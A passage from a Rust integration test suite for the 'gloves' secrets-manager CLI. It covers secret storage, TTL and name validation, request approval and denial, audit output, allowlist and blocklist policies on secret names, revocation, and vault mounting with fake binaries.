            config_path.to_str().unwrap(),
            "secrets",
            "get",
            "x",
            "--pipe-to-args",
            "applecli --data one token:{secret}",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "must include at least one http(s) URL argument",
        ));
}

#[test]
fn cli_get_pipe_to_args_rejects_non_utf8_secret_values() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root", root, "secrets", "set", "bin", "--stdin", "--ttl", "1",
        ])
        .write_stdin(vec![0xff, 0x00, 0x61, 0x80])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "bin",
            "--pipe-to-args",
            "cat {secret}",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("not valid UTF-8"));
}

#[test]
fn cli_get_pipe_to_args_rejects_control_characters() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "linebreak",
            "--stdin",
            "--ttl",
            "1",
        ])
        .write_stdin("line1\nline2")
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "linebreak",
            "--pipe-to-args",
            "cat {secret}",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("contains control characters"));
}

#[test]
fn cli_set_from_stdin() {
    let temp_dir = tempfile::tempdir().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "secrets",
            "set",
            "stdin_secret",
            "--stdin",
            "--ttl",
            "1",
        ])
        .write_stdin("from-stdin\n")
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "secrets",
            "get",
            "stdin_secret",
            "--pipe-to",
            TEST_PIPE_COMMAND,
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("from-stdin"));
}

#[test]
fn cli_set_empty_stdin_rejected() {
    let temp_dir = tempfile::tempdir().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "secrets",
            "set",
            "stdin_secret",
            "--stdin",
            "--ttl",
            "1",
        ])
        .write_stdin("\n")
        .assert()
        .failure();
}

#[test]
fn cli_set_requires_input_source() {
    let temp_dir = tempfile::tempdir().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "secrets",
            "set",
            "missing_input",
        ])
        .assert()
        .failure();
}

#[test]
fn cli_set_rejects_generate_and_value() {
    let temp_dir = tempfile::tempdir().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "secrets",
            "set",
            "x",
            "--generate",
            "--value",
            "secret",
        ])
        .assert()
        .failure();
}

#[test]
fn cli_set_rejects_empty_value() {
    let temp_dir = tempfile::tempdir().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "secrets",
            "set",
            "x",
            "--value",
            "",
        ])
        .assert()
        .failure();
}

#[test]
fn cli_set_rejects_non_positive_ttl() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root", root, "secrets", "set", "ttl_zero", "--value", "x", "--ttl", "0",
        ])
        .assert()
        .failure();
    let stderr = String::from_utf8(assert.get_output().stderr.clone()).unwrap();
    assert!(stderr.contains("--ttl must be greater than zero"));
    assert!(stderr.contains("use a positive day count"));
    assert!(stderr.contains("--ttl 1"));

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "ttl_negative",
            "--value",
            "x",
            "--ttl=-1",
        ])
        .assert()
        .failure();
}

#[test]
fn cli_set_invalid_secret_name_includes_name_rules_hint() {
    let temp_dir = tempfile::tempdir().unwrap();
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "secrets",
            "set",
            "db pass!",
            "--value",
            "x",
            "--ttl",
            "1",
        ])
        .assert()
        .failure();
    let stderr = String::from_utf8(assert.get_output().stderr.clone()).unwrap();
    assert!(stderr.contains("invalid character in name"));
    assert!(stderr.contains("[A-Za-z0-9._/-]"));
}

#[test]
fn cli_get_redacted() {
    let temp_dir = tempfile::tempdir().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "env",
            "x",
            "VAR",
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("<REDACTED>"));
}

#[test]
fn cli_get_raw_tty_warning() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--value",
            "placeholder",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("GLOVES_FORCE_TTY_WARNING", "1")
        .args(["--root", root, "secrets", "get", "x"])
        .assert()
        .stderr(predicates::str::contains("warning"));
}

#[test]
fn cli_request() {
    let temp_dir = tempfile::tempdir().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "request",
            "x",
            "--reason",
            "test",
        ])
        .assert()
        .success();

    let pending = std::fs::read_to_string(temp_dir.path().join("pending.json")).unwrap();
    assert!(pending.contains("test"));
}

#[test]
fn cli_request_twice_uses_existing_signing_key() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "request", "x", "--reason", "first"])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "request", "x", "--reason", "second"])
        .assert()
        .success();
}

#[test]
fn cli_request_fails_when_pending_json_is_unreadable() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "init"])
        .assert()
        .success();

    let pending_path = temp_dir.path().join("pending.json");
    std::fs::remove_file(&pending_path).unwrap();
    std::fs::create_dir(&pending_path).unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "request", "x", "--reason", "test"])
        .assert()
        .failure();
}

#[test]
fn cli_approve_request() {
    let temp_dir = tempfile::tempdir().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "request",
            "x",
            "--reason",
            "test",
        ])
        .assert()
        .success();

    let pending: serde_json::Value =
        serde_json::from_slice(&std::fs::read(temp_dir.path().join("pending.json")).unwrap())
            .unwrap();
    let request_id = pending[0]["id"].as_str().unwrap();

    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "approve",
            request_id,
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();

    let payload: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(payload["action"], "approved");
    assert_eq!(payload["secret_name"], "x");
    assert_eq!(payload["reason"], "test");
    assert_eq!(payload["status"], "fulfilled");
    assert_eq!(payload["pending"], false);
    assert_eq!(payload["approved_by"], "default-agent");
    assert!(payload["approved_at"].is_string());
    assert!(payload["denied_by"].is_null());
    assert!(payload["denied_at"].is_null());

    let pending_after: serde_json::Value =
        serde_json::from_slice(&std::fs::read(temp_dir.path().join("pending.json")).unwrap())
            .unwrap();
    assert_eq!(pending_after[0]["status"], "fulfilled");
    assert_eq!(pending_after[0]["pending"], false);
    assert_eq!(pending_after[0]["approved_by"], "default-agent");
    assert!(pending_after[0]["approved_at"].is_string());
}

#[test]
fn cli_approve_invalid_uuid_fails() {
    let temp_dir = tempfile::tempdir().unwrap();
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "approve",
            "not-a-uuid",
        ])
        .assert()
        .failure();
    let stderr = String::from_utf8(assert.get_output().stderr.clone()).unwrap();
    assert!(stderr.contains("invalid request id `not-a-uuid`"));
    assert!(stderr.contains("gloves requests list"));
    assert!(stderr.contains("gloves approve <request-id>"));
}

#[test]
fn cli_approve_requests_label_explains_expected_id() {
    let temp_dir = tempfile::tempdir().unwrap();
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "approve",
            "requests",
        ])
        .assert()
        .failure();
    let stderr = String::from_utf8(assert.get_output().stderr.clone()).unwrap();
    assert!(stderr.contains("`requests` is a label, not a request id"));
    assert!(stderr.contains("gloves requests list"));
}

#[test]
fn cli_error_output_includes_error_code_and_explain_command() {
    let temp_dir = tempfile::tempdir().unwrap();
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "approve",
            "requests",
        ])
        .assert()
        .failure();
    let stderr = String::from_utf8(assert.get_output().stderr.clone()).unwrap();
    assert!(stderr.contains("error[E102]:"));
    assert!(stderr.contains("gloves explain E102"));
}

#[test]
fn cli_explain_known_error_code_prints_guidance() {
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["explain", "E102"])
        .assert()
        .success();
    let stdout = String::from_utf8(assert.get_output().stdout.clone()).unwrap();
    assert!(stdout.contains("E102 invalid request identifier"));
    assert!(stdout.contains("gloves requests list"));
    assert!(stdout.contains("gloves requests approve <request-id>"));
}

#[test]
fn cli_explain_unknown_error_code_lists_known_codes() {
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["explain", "E1234"])
        .assert()
        .failure();
    let stderr = String::from_utf8(assert.get_output().stderr.clone()).unwrap();
    assert!(stderr.contains("unknown error code `E1234`"));
    assert!(stderr.contains("Known codes:"));
    assert!(stderr.contains("E102"));
}

#[test]
fn cli_requests_group_list_and_approve_flow() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "request", "x", "--reason", "test"])
        .assert()
        .success();

    let list_output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "requests", "list"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let list_payload: serde_json::Value = serde_json::from_slice(&list_output).unwrap();
    assert!(list_payload.is_array());
    assert_eq!(list_payload[0]["status"], "pending");

    let request_id = list_payload[0]["id"].as_str().unwrap();
    let approve_output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "requests", "approve", request_id])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let approve_payload: serde_json::Value = serde_json::from_slice(&approve_output).unwrap();
    assert_eq!(approve_payload["action"], "approved");
    assert_eq!(approve_payload["status"], "fulfilled");
}

#[test]
fn cli_req_alias_routes_to_requests_deny() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "request", "x", "--reason", "test"])
        .assert()
        .success();
    let request_id = first_pending_request_id(temp_dir.path());

    let deny_output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "req", "deny", &request_id])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let deny_payload: serde_json::Value = serde_json::from_slice(&deny_output).unwrap();
    assert_eq!(deny_payload["action"], "denied");
    assert_eq!(deny_payload["status"], "denied");
}

#[test]
fn cli_deny_request() {
    let temp_dir = tempfile::tempdir().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "request",
            "x",
            "--reason",
            "test",
        ])
        .assert()
        .success();

    let pending: serde_json::Value =
        serde_json::from_slice(&std::fs::read(temp_dir.path().join("pending.json")).unwrap())
            .unwrap();
    let request_id = pending[0]["id"].as_str().unwrap();

    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "deny",
            request_id,
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();

    let payload: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(payload["action"], "denied");
    assert_eq!(payload["secret_name"], "x");
    assert_eq!(payload["reason"], "test");
    assert_eq!(payload["status"], "denied");
    assert_eq!(payload["pending"], false);
    assert_eq!(payload["denied_by"], "default-agent");
    assert!(payload["denied_at"].is_string());
    assert!(payload["approved_by"].is_null());
    assert!(payload["approved_at"].is_null());

    let pending_after: serde_json::Value =
        serde_json::from_slice(&std::fs::read(temp_dir.path().join("pending.json")).unwrap())
            .unwrap();
    assert_eq!(pending_after[0]["status"], "denied");
    assert_eq!(pending_after[0]["pending"], false);
    assert_eq!(pending_after[0]["denied_by"], "default-agent");
    assert!(pending_after[0]["denied_at"].is_string());
}

#[test]
fn cli_approve_rejects_non_pending_request() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "request", "x", "--reason", "test"])
        .assert()
        .success();
    let request_id = first_pending_request_id(temp_dir.path());

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "approve", &request_id])
        .assert()
        .success();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "approve", &request_id])
        .assert()
        .failure()
        .stderr(predicates::str::contains("request is not pending"));
}

#[test]
fn cli_list() {
    let temp_dir = tempfile::tempdir().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", temp_dir.path().to_str().unwrap(), "list"])
        .assert()
        .success()
        .stdout(predicates::str::contains("["));
}

#[test]
fn cli_audit_json_includes_command_events() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "init"])
        .assert()
        .success();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "list"])
        .assert()
        .success();

    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "--json", "audit", "--limit", "20"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let payload: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(payload["status"], "ok");
    assert_eq!(payload["command"], "audit");
    let entries = payload["result"]["entries"].as_array().unwrap();
    assert!(entries.iter().any(|entry| {
        entry["event"] == "command_executed"
            && entry["command"] == "list"
            && entry["interface"] == "cli"
    }));
}

#[test]
fn cli_audit_pretty_output_is_human_readable() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "init"])
        .assert()
        .success();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "list"])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "audit", "--limit", "5"])
        .assert()
        .success()
        .stdout(predicates::str::contains("\tcommand_executed\t"));
}

#[test]
fn cli_list_pending_filters_only_pending_requests() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "request", "x", "--reason", "first"])
        .assert()
        .success();
    let first_request_id = first_pending_request_id(temp_dir.path());
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "request", "y", "--reason", "second"])
        .assert()
        .success();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "approve", &first_request_id])
        .assert()
        .success();

    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "list", "--pending"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let entries: serde_json::Value = serde_json::from_slice(&output).unwrap();
    let entries = entries.as_array().unwrap();
    assert_eq!(entries.len(), 1);
    assert_eq!(entries[0]["kind"], "pending");
    assert_eq!(entries[0]["status"], "pending");
    assert_eq!(entries[0]["pending"], true);
    assert_eq!(entries[0]["secret_name"], "y");
}

#[test]
fn cli_request_allowlist_allows_matching_secret() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(REQUEST_ALLOWLIST_ENV_VAR, "deploy/*")
        .args([
            "--root",
            root,
            "request",
            "deploy/token",
            "--reason",
            "test",
        ])
        .assert()
        .success();
}

#[test]
fn cli_request_allowlist_rejects_non_matching_secret() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(REQUEST_ALLOWLIST_ENV_VAR, "deploy/*")
        .args(["--root", root, "request", "infra/token", "--reason", "test"])
        .assert()
        .failure()
        .stderr(predicates::str::contains("not allowlisted"));
}

#[test]
fn cli_request_blocklist_rejects_blocked_secret() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(REQUEST_ALLOWLIST_ENV_VAR, "*")
        .env(REQUEST_BLOCKLIST_ENV_VAR, "infra/*")
        .args(["--root", root, "request", "infra/token", "--reason", "test"])
        .assert()
        .failure()
        .stderr(predicates::str::contains("is blocked"));
}

#[test]
fn cli_request_allowlist_flag_overrides_env() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(REQUEST_ALLOWLIST_ENV_VAR, "dev/*")
        .args([
            "--root",
            root,
            "request",
            "prod/token",
            "--reason",
            "test",
            "--allowlist",
            "prod/*",
        ])
        .assert()
        .success();
}

#[test]
fn cli_request_blocklist_flag_rejects_blocked_secret() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "request",
            "prod/token",
            "--reason",
            "test",
            "--allowlist",
            "*",
            "--blocklist",
            "prod/*",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("is blocked"));
}

#[test]
fn cli_approve_respects_request_allowlist_policy() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "request", "prod/token", "--reason", "test"])
        .assert()
        .success();
    let request_id = first_pending_request_id(temp_dir.path());

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(REQUEST_ALLOWLIST_ENV_VAR, "dev/*")
        .args(["--root", root, "approve", &request_id])
        .assert()
        .failure()
        .stderr(predicates::str::contains("not allowlisted"));
}

#[test]
fn cli_approve_respects_request_blocklist_policy() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "request", "prod/token", "--reason", "test"])
        .assert()
        .success();
    let request_id = first_pending_request_id(temp_dir.path());

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(REQUEST_BLOCKLIST_ENV_VAR, "prod/*")
        .args(["--root", root, "approve", &request_id])
        .assert()
        .failure()
        .stderr(predicates::str::contains("is blocked"));
}

#[test]
fn cli_revoke() {
    let temp_dir = tempfile::tempdir().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "secrets",
            "set",
            "x",
            "--generate",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "secrets",
            "revoke",
            "x",
        ])
        .assert()
        .success();

    assert!(!temp_dir.path().join("store/x.age").exists());
}

#[test]
fn cli_revoke_missing_secret_suggests_recovery() {
    let temp_dir = tempfile::tempdir().unwrap();
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "secrets",
            "revoke",
            "missing",
        ])
        .assert()
        .failure();
    let stderr = String::from_utf8(assert.get_output().stderr.clone()).unwrap();
    assert!(stderr.contains("secret `missing` was not found"));
    assert!(stderr.contains("gloves list"));
    assert!(stderr.contains("gloves secrets revoke <secret-name>"));
}

#[test]
fn cli_status() {
    let temp_dir = tempfile::tempdir().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "request",
            "x",
            "--reason",
            "test",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "secrets",
            "status",
            "x",
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("pending"));
}

#[test]
fn cli_status_defaults_to_fulfilled() {
    let temp_dir = tempfile::tempdir().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "secrets",
            "status",
            "missing",
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("fulfilled"));
}

#[test]
fn cli_verify() {
    let temp_dir = tempfile::tempdir().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", temp_dir.path().to_str().unwrap(), "verify"])
        .assert()
        .success();
}

#[test]
fn cli_verify_fails_on_invalid_metadata_file() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "init"])
        .assert()
        .success();

    let invalid_path = temp_dir.path().join("meta").join("bad.json");
    std::fs::write(invalid_path, b"{invalid-json").unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", root, "verify"])
        .assert()
        .failure();
}

#[cfg(unix)]
#[test]
fn cli_vault_init() {
    let temp_dir = tempfile::tempdir().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_vault_binaries(&fake_bin);

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "vault",
            "init",
            "agent_data",
            "--owner",
            "agent",
        ])
        .assert()
        .success();

    assert!(temp_dir.path().join("vaults/agent_data.toml").exists());
}

#[cfg(unix)]
#[test]
fn cli_vault_init_respects_configured_agent_id() {
    let temp_dir = tempfile::tempdir().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_vault_binaries(&fake_bin);
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");
    write_config(
        &config_path,
        &format!(
            "version = 1\n[paths]\nroot = \"{}\"\n[defaults]\nagent_id = \"main\"\nsecret_ttl_days = 1\nvault_mount_ttl = \"1h\"\nvault_secret_ttl_days = 2\nvault_secret_length_bytes = 16\n",
            root.display()
        ),
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "vault",
            "init",
            "agent_data",
            "--owner",
            "agent",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "secrets",
            "get",
            "vault/agent_data",
            "--pipe-to",
            TEST_PIPE_COMMAND,
        ])
        .assert()
        .success();

    let metadata: serde_json::Value =
        serde_json::from_slice(&std::fs::read(root.join("meta/vault/agent_data.json")).unwrap())
            .unwrap();
    assert_eq!(metadata["created_by"], "main");
    assert_eq!(metadata["recipients"][0], "main");
}

#[cfg(unix)]
#[test]
fn cli_vault_init_uses_configured_secret_defaults() {
    let temp_dir = tempfile::tempdir().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_vault_binaries(&fake_bin);
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");
    write_config(
        &config_path,
        &format!(
            "version = 1\n[paths]\nroot = \"{}\"\n[defaults]\nagent_id = \"main\"\nsecret_ttl_days = 1\nvault_mount_ttl = \"1h\"\nvault_secret_ttl_days = 2\nvault_secret_length_bytes = 16\n",
            root.display()
        ),
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "vault",
            "init",
            "agent_data",
            "--owner",
            "agent",
        ])
        .assert()
        .success();

    let metadata: serde_json::Value =
        serde_json::from_slice(&std::fs::read(root.join("meta/vault/agent_data.json")).unwrap())
            .unwrap();
    let created = DateTime::parse_from_rfc3339(metadata["created_at"].as_str().unwrap())
        .unwrap()
        .with_timezone(&Utc);
    let expires = DateTime::parse_from_rfc3339(metadata["expires_at"].as_str().unwrap())
        .unwrap()
        .with_timezone(&Utc);
    assert_eq!(expires - created, chrono::Duration::days(2));

    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "secrets",
            "get",
            "vault/agent_data",
            "--pipe-to",
            TEST_PIPE_COMMAND,
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(output.len(), 16);
}

#[cfg(unix)]
#[test]
fn cli_vault_mount_without_config_discovers_config_from_root() {
    let temp_dir = tempfile::tempdir().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_vault_binaries(&fake_bin);
    let workspace = temp_dir.path().join("workspace");
    let root = workspace.join("secrets");
    fs::create_dir_all(&workspace).unwrap();
    let config_path = workspace.join(".gloves.toml");
    write_config(
        &config_path,
        &format!(
            "version = 1\n[paths]\nroot = \"{}\"\n[defaults]\nagent_id = \"main\"\nsecret_ttl_days = 1\nvault_mount_ttl = \"1h\"\nvault_secret_ttl_days = 2\nvault_secret_length_bytes = 16\n",
            root.display()
        ),
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "vault",
            "init",
            "agent_data",
            "--owner",
            "agent",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root.to_str().unwrap(),
            "vault",
            "mount",
            "agent_data",
            "--ttl",
            "1h",
        ])
        .assert()
        .success();
}

#[cfg(unix)]
#[test]
fn cli_vault_mount() {
    let temp_dir = tempfile::tempdir().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_vault_binaries(&fake_bin);
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root,
            "vault",
            "init",
            "agent_data",
            "--owner",
            "agent",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root,
            "vault",
            "mount",
            "agent_data",
            "--ttl",
            "1h",
        ])
        .assert()
        .success();

    let sessions = std::fs::read_to_string(temp_dir.path().join("vaults/sessions.json")).unwrap();
    assert!(sessions.contains("agent_data"));
}

#[cfg(unix)]
#[test]
fn cli_vault_mount_uses_mount_agent_for_extpass_env() {
    let temp_dir = tempfile::tempdir().unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_vault_binaries_with_extpass_agent_log(&fake_bin);
    let extpass_agent_log = temp_dir.path().join("extpass-agent.log");
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root,
            "vault",
            "init",
            "agent_data",
            "--owner",
            "agent",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .env(
